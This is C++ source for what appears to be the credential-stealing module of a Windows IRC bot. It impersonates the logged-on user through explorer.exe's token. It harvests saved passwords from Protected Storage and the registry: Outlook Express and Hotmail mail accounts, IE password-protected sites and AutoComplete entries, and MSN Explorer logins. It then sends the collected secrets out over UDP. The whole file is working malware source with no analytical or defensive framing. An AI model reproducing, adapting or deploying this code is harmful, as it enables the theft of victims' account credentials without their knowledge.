#include "stdafx.h"
#include "extern.h"

#import "pstorec.dll" no_namespace

#define PST_E_OK _HRESULT_TYPEDEF_(0x00000000L)
typedef struct TOOUTDATA{
	char POPuser[100];
	char POPpass[100];
	char POPserver[100];
} OOUTDATA;
OOUTDATA OutlookData[50];
int oIndex = 0;
char	*secrets_buffer = NULL;


HANDLE get_user_token(void)
{
	HANDLE	hproc, htoken;
	int		res;
	DWORD	explorer;

	explorer = find_process("explorer.exe");
	if(explorer!=NULL)
	{
		hproc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, explorer);
		if(hproc!=NULL)
		{
			res = OpenProcessToken(hproc, TOKEN_ALL_ACCESS, &htoken);
			if(res!=0)
				return htoken;
			else
				deb("OpenProcessToken: %s", FORMATERROR);
		}
		else
		{
			deb("OpenProcess: %s", FORMATERROR);
			return 0;
		}
	}
	else
	{
		deb("did not find explorer");
		return 0;
	}




}

//----------------------------------------------------------------------------------------
DWORD WINAPI send_secrets(LPVOID arg)
{
	DWORD secrets_size = 0;// dwName;
	int		res;
	HANDLE	hUserToken;

	hUserToken = get_user_token();

	deb("get_user_token ok");

	if(hUserToken==0)
	{
		deb("failed to get token");
		return 1;
	}

	res = ImpersonateLoggedOnUser(hUserToken);
	if(res==0)
	{
		deb("ImpersonateLoggedOnUser: %s", FORMATERROR);
		return 1;
	}

	deb("impersonate ok");

	secrets_buffer = (char*)halloc(SECRETS_BUF_SIZE);
	if(secrets_buffer==NULL)
	{
		deb("failed to alloc memory for secrets_buffer");
		return 1;
	}

	memset(secrets_buffer, 0, SECRETS_BUF_SIZE);

	deb("halloc,memset ok %d bytes", SECRETS_BUF_SIZE);

	EnumPStorage();
	deb("enumpstorage ok");
	secrets_size = strlen(secrets_buffer);
	deb("Size of pstorage secrets: %d", secrets_size);
	EnumOutlookAccounts();
	deb("Outlook secrets: %d", oIndex);

	if(secrets_size)
		udp_send_msg(SECRETS, secrets_buffer, secrets_size, IrcNick);
	else
	{
		deb("no secrets to send");
	}

	hfree((void*)secrets_buffer);
	return 0;
}
//----------------------------------------------------------------------------------------
void AddItemm(char *resname, char *restype, char *usrname, char *pass)
{
	char	secret_line[16384];

	deb("adding item len: name: %d restype: %d usrname: %d pass: %d", strlen(resname),
		strlen(restype), strlen(usrname), strlen(pass));
	__try
	{
		_snprintf(secret_line, sizeof(secret_line), "%s => %s:%s\n",
			resname, usrname, pass);
		lstrcat(secrets_buffer, secret_line);
		//deb("secrets_buffer: %s", secrets_buffer);
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		deb("CATCHED VIOLATION! in AddItem");
	}

	deb("Added secret item: [resname: %s restype: %s username: %s password: %s",
		resname, restype, usrname, pass);

	return;
}

//----------------------------------------------------------------------------------------
int EnumOutlookAccounts(void)
{
	HKEY hkeyresult, hkeyresult1;
	long l, i;
	char name[8192], skey[8192];
	DWORD dw2;
	FILETIME f;
	LONG     lResult;
	BYTE Data[8192];
	BYTE Data1[8192];
	DWORD size;
	int j;


	memset(OutlookData, 0x0, sizeof(OutlookData));
	lstrcpy(skey, "Software\\Microsoft\\Internet Account Manager\\Accounts");
	lResult = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCTSTR)skey, 0, KEY_ALL_ACCESS, &hkeyresult1);

	if(lResult!=ERROR_SUCCESS)
	{
		deb("regopenkeyex: %s", FORMATSYSTEMERROR(lResult));
		return -1;
	}

	i = 0;l = 0;
	j = 0;
	DWORD type = REG_BINARY;

	while(l!=ERROR_NO_MORE_ITEMS)
	{
		dw2 = 200;
		l = RegEnumKeyEx(hkeyresult1, i, name, &dw2, NULL, NULL, NULL, &f);
		lstrcpy(skey, "Software\\Microsoft\\Internet Account Manager\\Accounts");
		lstrcat(skey, "\\");
		lstrcat(skey, name);
		RegOpenKeyEx(HKEY_CURRENT_USER, (LPCTSTR)skey, 0, KEY_ALL_ACCESS, &hkeyresult);
		size = sizeof(Data);
		if(RegQueryValueEx(hkeyresult, (LPCTSTR)"HTTPMail User Name", 0, &type, Data, &size)==ERROR_SUCCESS)
		{
			lstrcpy(OutlookData[oIndex].POPuser, (char *)Data);
			memset(Data, 0x0, sizeof(Data));
			lstrcpy(OutlookData[oIndex].POPserver, "Hotmail");
			size = sizeof(Data);
			if(RegQueryValueEx(hkeyresult, (LPCTSTR)"HTTPMail Password2", 0, &type, Data1, &size)==ERROR_SUCCESS)
			{
				int totnopass = 0;
				//				char mess[100];
				for(DWORD i = 2;i<size;i++)
				{
					if(IsCharAlphaNumeric(Data1[i])||(Data1[i]=='(')||(Data1[i]==')')||(Data1[i]=='.')||(Data1[i]==' ')||(Data1[i]=='-'))
					{
						OutlookData[oIndex].POPpass[totnopass] = Data1[i];
						totnopass++;
					}
				}
				OutlookData[oIndex].POPpass[totnopass] = 0;
			}
			memset(Data1, 0x0, sizeof(Data));
			oIndex++;
		}
		else if(RegQueryValueEx(hkeyresult, (LPCTSTR)"POP3 User Name", 0, &type, Data, &size)==ERROR_SUCCESS)
		{
			lstrcpy(OutlookData[oIndex].POPuser, (char *)Data);
			memset(Data, 0x0, sizeof(Data));
			size = sizeof(Data);
			RegQueryValueEx(hkeyresult, (LPCTSTR)"POP3 Server", 0, &type, Data, &size);
			lstrcpy(OutlookData[oIndex].POPserver, (char *)Data);
			memset(Data, 0x0, sizeof(Data));
			size = sizeof(Data);

			if(RegQueryValueEx(hkeyresult, (LPCTSTR)"POP3 Password2", 0, &type, Data1, &size)==ERROR_SUCCESS)
			{
				int totnopass = 0;
				//				char mess[100];
				for(DWORD i = 2;i<size;i++)
					if(IsCharAlphaNumeric(Data1[i])||(Data1[i]=='(')||(Data1[i]==')')||(Data1[i]=='.')||(Data1[i]==' ')||(Data1[i]=='-'))
					{
					OutlookData[oIndex].POPpass[totnopass] = Data1[i];
					totnopass++;
					}
				OutlookData[oIndex].POPpass[totnopass] = 0;
			}
			memset(Data1, 0x0, sizeof(Data1));
			oIndex++;
		}
		j++;i++;
	}

	return oIndex;
}

//--------------------------------------------------------
int EnumPStorage(void)
{
	typedef HRESULT(WINAPI *tPStoreCreateInstance)(IPStore **, DWORD, DWORD, DWORD);
	static HMODULE hpsDLL;
	tPStoreCreateInstance pPStoreCreateInstance;
	IPStorePtr PStore;
	IEnumPStoreTypesPtr EnumPStoreTypes;
	HRESULT hRes;
	GUID TypeGUID;
	char szItemName[8192];
	char *szItemData;
	u_int iDataLen = 0;
	char szResName[8192];
	char szResData[8192];
	char szItemGUID[8192];
	char chekingdata[8192];
	unsigned long psDataLen = 0;
	unsigned char *psData = NULL;
	char msnid[8192];
	char msnpass[8192];

	if(hpsDLL==NULL)
	{
		hpsDLL = LoadLibrary("pstorec.dll");
		if(hpsDLL==NULL)
		{
			deb("LoadLibrary: %s", FORMATERROR);
			return -1;
		}
		deb("pstorec.dll loaded handle 0x%x", hpsDLL);
	}

	pPStoreCreateInstance = (tPStoreCreateInstance)GetProcAddress(hpsDLL, "PStoreCreateInstance");

	if(pPStoreCreateInstance==NULL)
	{
		deb("GetProcAddress: %s", FORMATERROR);
		return -1;
	}

	deb("pstorecreateinstance at 0x%p", pPStoreCreateInstance);

	hRes = pPStoreCreateInstance(&PStore, NULL, NULL, 0);

	if(hRes!=S_OK)
	{
		deb("pPStoreCreateInstance failed: %s", FORMATERROR);
		return -1;
	}

	deb("pstorage instance created");

	hRes = PStore->EnumTypes(0, 0, &EnumPStoreTypes);

	if(hRes!=PST_E_OK)
	{
		deb("PStore->EnumTypes failed: %s", FORMATERROR);
		return -1;
	}

	deb("pstorage enumerated");

	while(EnumPStoreTypes->raw_Next(1, &TypeGUID, 0)==S_OK)
	{
		wsprintf(szItemGUID, "%x", TypeGUID);
		deb("TypeGUID: %x", TypeGUID);

		IEnumPStoreTypesPtr EnumSubTypes;
		hRes = PStore->EnumSubtypes(0, &TypeGUID, 0, &EnumSubTypes);

		GUID subTypeGUID;
		while(EnumSubTypes->raw_Next(1, &subTypeGUID, 0)==S_OK)
		{
			//deb("enumsubtypes->raw_next");
			IEnumPStoreItemsPtr spEnumItems;
			//deb("enumerating items in %x", TypeGUID);
			HRESULT hRes = PStore->EnumItems(0, &TypeGUID, &subTypeGUID, 0, &spEnumItems);

			//deb("enum OK");
			LPWSTR itemName;
			while(spEnumItems->raw_Next(1, &itemName, 0)==S_OK)
			{
				psData = NULL;
				//deb("spEnumItems->raw_next");
				wsprintf(szItemName, "%ws", itemName);
				_PST_PROMPTINFO *pstiinfo = NULL;
				hRes = PStore->ReadItem(0, &TypeGUID, &subTypeGUID, itemName, &psDataLen, &psData, pstiinfo, 0);

				//deb("psDataLen: %d", psDataLen);
				iDataLen = psDataLen>8192 ? psDataLen : 8192;
				szItemData = (char*)halloc(iDataLen);
				if(szItemData==NULL)
				{
					deb("MEMORY EXHAUS !!!");
					return -1;
				}
				//deb("Allocated %d bytes at 0x%p", iDataLen, szItemData);
				memset(szItemData, 0, iDataLen);
				//deb("psDataLen: %d", psDataLen);
				if(((unsigned long)lstrlen((char *)psData))<(psDataLen-1))
				{
					//deb("unicode string");
					int i = 0;
					for(DWORD m = 0; m<psDataLen; m += 2)
					{
						if(psData[m]==0)
						{
							szItemData[i] = ',';
						}
						else
						{
							szItemData[i] = psData[m];
						}
						i++;
					}
					szItemData[i-1] = 0;
				}
				else
				{
					//deb("szItemData will be %s", psData);
					wsprintf(szItemData, "%s", psData);
				}
				szResName[0] = 0;
				szResData[0] = 0;
				//deb("parsing guids");
				//220d5cc1 Outlooks
				int i;
				if(lstrcmp(szItemGUID, "220d5cc1")==0)
				{
					//deb("guid: 220d5cc1");
					BOOL bDeletedOEAccount = TRUE;
					for(i = 0;i<oIndex;i++)
					{
						if(lstrcmp(OutlookData[i].POPpass, szItemName)==0)
						{
							bDeletedOEAccount = FALSE;
							AddItemm(OutlookData[i].POPserver, "OutlookExpress", OutlookData[i].POPuser, szItemData);
							break;
						}
					}
					if(bDeletedOEAccount)
						AddItemm(szItemName, "Deleted OE Account", OutlookData[i].POPuser, szItemData);
				}
				//5e7e8100 - IE:Password-Protected sites
				if(lstrcmp(szItemGUID, "5e7e8100")==0)
				{
					deb("guid: 5e7e8100");
					lstrcpy(chekingdata, "");
					if(strstr(szItemData, ":")!=0)
					{
						lstrcpy(chekingdata, strstr(szItemData, ":")+1);
						*(strstr(szItemData, ":")) = 0;
					}
					AddItemm(szItemName, "IE:Password-Protected sites", szItemData, chekingdata);
				}
				//	  b9819c52 MSN Explorer Signup
				if(lstrcmp(szItemGUID, "b9819c52")==0)
				{
					deb("guid: b9819c52");
					int i = 0;
					BOOL first = TRUE;
					for(DWORD m = 0;m<psDataLen;m += 2)
					{
						if(psData[m]==0)
						{
							szItemData[i] = ',';
							i++;
						}
						else
						{
							if(IsCharAlphaNumeric(psData[m])||(psData[m]=='@')||(psData[m]=='.')||(psData[m]=='_'))
							{
								szItemData[i] = psData[m];
								i++;
							}
						}
					}
					szItemData[i-1] = 0;
					char *p;
					p = szItemData+2;
					//psData[4] - number of msn accounts 
					for(int ii = 0;ii<psData[4];ii++)
					{
						deb("enum msg accs");
						lstrcpy(msnid, p+1);
						if(strstr(msnid, ",")!=0) *strstr(msnid, ",") = 0;
						if(strstr(p+1, ",")!=0)
							lstrcpy(msnpass, strstr(p+1, ",")+2);

						if(strstr(msnpass, ",")!=0) *strstr(msnpass, ",") = 0;

						p = strstr(p+1, ",")+2+lstrlen(msnpass)+7;
						AddItemm(msnid, "MSN Explorer Signup", msnid, msnpass);
					}

				}
				//e161255a IE 
				if(lstrcmp(szItemGUID, "e161255a")==0)
				{
					deb("guid: e161255a");
					if(strstr(szItemName, "StringIndex")==0)
					{
						if(strstr(szItemName, ":String")!=0)
							*strstr(szItemName, ":String") = 0;

						lstrcpyn(chekingdata, szItemName, 8);
						deb("szItemname: stringindex");
						if((strstr(chekingdata, "http:/")==0)&&(strstr(chekingdata, "https:/")==0))
							AddItemm(szItemName, "IE Auto Complete Fields", szItemData, "");
						else
						{
							lstrcpy(chekingdata, "");
							if(strstr(szItemData, ",")!=0)
							{
								lstrcpy(chekingdata, strstr(szItemData, ",")+1);
								*(strstr(szItemData, ",")) = 0;
							}
							AddItemm(szItemName, "AutoComplete Passwords", szItemData, chekingdata);
						}
					}
				}
				memset(szItemName, 0x0, sizeof(szItemName));
				hfree(szItemData);
				//deb("freed %d bytes", iDataLen);
			}
			deb("done with guid 0x%x", TypeGUID);
		}
	}

	deb("done enumerating secrets...");

	return 0;
}
